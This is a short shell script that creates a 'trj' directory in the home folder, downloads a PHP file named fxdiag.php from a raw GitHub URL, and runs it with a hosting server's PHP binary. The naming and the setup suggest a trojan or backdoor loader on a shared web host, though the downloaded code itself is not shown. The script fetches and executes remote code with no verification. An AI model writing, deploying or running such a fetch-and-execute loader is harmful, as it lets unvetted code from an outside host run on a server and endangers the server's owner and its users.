#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o fxdiag.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/fxdiag.php?t=$(date +%s)" && mv fxdiag.php.new fxdiag.php
/opt/alt/php83/usr/bin/php fxdiag.php "$1"
